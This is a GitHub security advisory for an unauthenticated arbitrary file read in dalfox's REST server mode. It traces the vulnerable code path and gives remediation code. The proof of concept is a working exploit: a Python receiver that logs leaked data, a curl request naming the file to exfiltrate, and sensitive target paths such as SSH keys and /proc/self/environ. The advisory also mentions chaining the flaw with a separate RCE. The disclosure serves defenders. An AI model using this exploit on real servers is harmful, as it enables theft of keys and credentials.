# [H] Dalfox Server Mode has an Unauthenticated Arbitrary File Read with Out-of-Band Exfiltration via `custom-payload-file`

## Summary
Severity: High
Advisory: GHSA-35wr-x7v6-9fv2
CVE: CVE-2026-45088
CWE: CWE-306, CWE-552, CWE-73
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-05-12
Source: https://github.com/advisories/GHSA-35wr-x7v6-9fv2
Type: github-advisory

## Affected
- Go: `github.com/hahwul/dalfox/v2` — affected >=0 <2.13.0

## Details
## Summary

When dalfox is run in REST API server mode, the `custom-payload-file` field in `model.Options` is JSON-tagged and deserialized directly from the attacker's request body, then propagated unchanged through `dalfox.Initialize` into the scan engine. The engine passes the value to `voltFile.ReadLinesOrLiteral`, which reads lines from any file path accessible to the dalfox process and embeds each line as an XSS payload in outbound HTTP requests directed at the attacker-controlled target URL. Because the server has no API key by default, an unauthenticated network attacker can exfiltrate the contents of arbitrary files on the dalfox host by reading them line-by-line through scan traffic.

## Severity

**High** (CVSS 3.1: 7.5)

`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`

- **Attack Vector:** Network — server binds to `0.0.0.0:6664` by default; reachable by any network peer.
- **Attack Complexity:** Low — no preconditions beyond network access; `skip-discovery` and `param` are both attacker-supplied, so the code path is fully under attacker control.
- **Privileges Required:** None — `--api-key` defaults to `""`, so the auth middleware is not registered.
- **User Interaction:** None.
- **Scope:** Unchanged — the file read and the outbound HTTP exfiltration request both originate from the same dalfox process authority.
- **Confidentiality Impact:** High — the attacker can read any file the dalfox process can open: private keys, configuration files containing database credentials, environment files, `/etc/passwd`, etc.
- **Integrity Impact:** None — this path is read-only.
- **Availability Impact:** None.

## Affected Component

- `cmd/server.go` — `init()` (line 51): `--api-key` defaults to `""` — no auth by default
- `pkg/server/server.go` — `setupEchoServer()` (line 68): auth middleware only registered when `APIKey != ""`
- `pkg/server/server.go` — `postScanHandler()` (lines 173–191): `rq.Options` (including `CustomPayloadFile`) passed to `ScanFromAPI` without sanitization
- `lib/func.go` — `Initialize()` (line 117): `CustomPayloadFile` explicitly propagated from caller options
- `pkg/scanning/scan.go` — anonymous block (lines 341–368): `voltFile.ReadLinesOrLiteral(options.CustomPayloadFile)` reads file; contents injected into outbound requests

## CWE

- **CWE-306**: Missing Authentication for Critical Function
- **CWE-73**: External Control of File Name or Path
- **CWE-552**: Files or Directories Accessible to External Parties

## Description

### `custom-payload-file` Is Fully Attacker-Controlled

`model.Options` exposes `CustomPayloadFile` with a JSON tag:

```go
// pkg/model/options.go:33
CustomPayloadFile string `json:"custom-payload-file,omitempty"`
```

`postScanHandler` binds the entire `Req.Options` from the JSON body and passes it directly to `ScanFromAPI`:

```go
// pkg/server/server.go:173-191
rq := new(Req)
if err := c.Bind(rq); err != nil { ... }
go ScanFromAPI(rq.URL, rq.Options, *options, sid)
```

`ScanFromAPI` passes `rqOptions` as `target.Options` to `dalfox.Initialize`:

```go
// pkg/server/scan.go:22-27
target := dalfox.Target{
    URL:     url,
    Method:  rqOptions.Method,
    Options: rqOptions,
}
newOptions := dalfox.Initialize(target, target.Options)
```

`Initialize` explicitly copies `CustomPayloadFile` into `newOptions` with no filtering:

```go
// lib/func.go:117
"CustomPayloadFile": {&newOptions.CustomPayloadFile, options.CustomPayloadFile},
```

### File Read and Exfiltration Path

In `pkg/scanning/scan.go`, when the scan engine reaches the custom payload phase, it reads the attacker-specified file path:

```go
// pkg/scanning/scan.go:341-366
if (options.SkipDiscovery || utils.IsAllowType(policy["Content-Type"])) && options.CustomPayloadFile != "" {
    ff, err := voltFile.ReadLinesOrLiteral(options.CustomPayloadFile)
    if err != nil {
        printing.DalLog("SYSTEM", "Failed to load custom XSS payload file", options)
    } else {
        for _, customPayload := range ff {
            if customPayload != "" {
                for k, v := range params {
                    if optimization.CheckInspectionParam(options, k) {
                        ...
                        tq, tm := optimization.MakeRequestQuery(target, k, customPayload, "inHTML"+ptype, "toAppend", encoder, options)
                        query[tq] = tm
                    }
                }
            }
        }
    }
}
```

Each line of the file becomes a payload value embedded in a query parameter of an HTTP request sent to the attacker-controlled target URL. `performScanning` then dispatches every entry in the `query` map via `SendReq`, delivering the file's contents to the attacker's server as the value of the nominated parameter (e.g., `?q=<file-line>`).

### Condition Is Trivially Satisfiable

The condition `options.SkipDiscovery || utils.IsAllowType(policy["Content-Type"])` is satisfied by setting `skip-discovery: true` in the JSON request body — a field the attacker fully controls. When `SkipDiscovery` is true, the engine also requires at least one parameter via `UniqParam` (the `-p` flag), which the attacker supplies as `param: ["q"]`. The code then hardcodes `policy["Content-Type"] = "text/html"` and populates `params["q"]` automatically:

```go
// pkg/scanning/scan.go:224-240
if len(options.UniqParam) == 0 {
    return scanResult, fmt.Errorf("--skip-discovery requires parameters to be specified with -p flag")
}
for _, paramName := range options.UniqParam {
    params[paramName] = model.ParamResult{
        Name: paramName, Type: "URL", Reflected: true, Chars: payload.GetSpecialChar(),
    }
}
policy["Content-Type"] = "text/html"
```

Both conditions are fully attacker-controlled through the JSON request body.

### No Defense at Any Layer

The same opt-in API key guard from the first finding applies identically here:

```go
// pkg/server/server.go:68-70
if options.ServerType == "rest" && options.APIKey != "" {
    e.Use(apiKeyAuth(options.APIKey, options))
}
```

With the default empty API key, no middleware is installed and every endpoint is unauthenticated. There is no path sanitization, no allowlist, and no `IsAPI` guard around the `CustomPayloadFile` read.

## Proof of Concept

```bash
# Step 1 — Attacker-controlled receiver (logs q= parameter to stdout)
python3 - <<'PY'
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        q = parse_qs(urlparse(self.path).query).get('q', [''])[0]
        print("[RECEIVED] q =", q, flush=True)
        body = b'<html><body>ok</body></html>'
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.send_header('Content-Length', str(len(body)))
        self.end_headers()
        self.wfile.write(body)
    def log_message(self, *a): pass
HTTPServer(('127.0.0.1', 18081), H).serve_forever()
PY

# Step 2 — Start dalfox REST server (default: no API key)
go run . server --host 127.0.0.1 --port 16664 --type rest

# Step 3 — Exfiltrate /etc/hostname (or any file readable by the dalfox process)
curl -s -X POST http://127.0.0.1:16664/scan \
  -H 'Content-Type: application/json' \
  --data '{
    "url": "http://127.0.0.1:18081/?q=test",
    "options": {
      "custom-payload-file": "/etc/hostname",
      "only-custom-payload": true,
      "skip-discovery": true,
      "param": ["q"],
      "use-headless": false,
      "worker": 1
    }
  }'

# Expected output on the receiver (Step 1 terminal):
# [RECEIVED] q = myhostname.local

# For multi-line files (e.g. /etc/passwd), each line arrives as a separate request
```

No `X-API-KEY` header is required. Replace `/etc/hostname` with any file path accessible to the dalfox process (e.g., `~/.ssh/id_rsa`, `/run/secrets/db_password`, `/proc/self/environ`).

## Impact

- **Arbitrary file read** on the dalfox host: any file readable by the dalfox process (SSH private keys, TLS certificates, `.env` files, cloud credential files, `/proc/self/environ`) can be exfiltrated one line at a time.
- **No authentication required** under the default configuration.
- The exfiltration channel is the dalfox host's own outbound HTTP scan traffic — no inbound connection from the attacker to the dalfox host is needed beyond the initial REST API call.
- Combined with the `found-action` RCE finding (separate issue), an attacker could first read `/proc/self/environ` to harvest secrets, then execute commands.

## Recommended Remediation

### Option 1: Strip filesystem-dangerous fields from API-sourced requests (preferred)

Apply a denylist of fields that should never be accepted from the REST API, regardless of auth state. This protects authenticated deployments against credential-theft or privilege escalation by external API consumers:

```go
// pkg/server/server.go — in postScanHandler, before ScanFromAPI:
rq.Options.CustomPayloadFile = ""
rq.Options.CustomBlindXSSPayloadFile = ""
rq.Options.FoundAction = ""
rq.Options.FoundActionShell = ""
rq.Options.OutputFile = ""
rq.Options.HarFilePath = ""
```

### Option 2: Require `--api-key` at server startup

Make authentication mandatory and refuse to start without it:

```go
// cmd/server.go — in runServerCmd:
if serverType == "rest" && apiKey == "" {
    fmt.Fprintln(os.Stderr, "ERROR: --api-key is required when running in REST server mode.")
    os.Exit(1)
}
```

Both options should be applied together. Option 2 prevents unauthenticated access to the API entirely; Option 1 ensures that even trusted API callers cannot leverage the server to read files from the host filesystem.

##Credit

Emmanuel David

Github:- https://github.com/drmingler

## References
- https://github.com/hahwul/dalfox/security/advisories/GHSA-35wr-x7v6-9fv2
- https://nvd.nist.gov/vuln/detail/CVE-2026-45088
- https://github.com/hahwul/dalfox
- https://github.com/hahwul/dalfox/releases/tag/v2.13.0
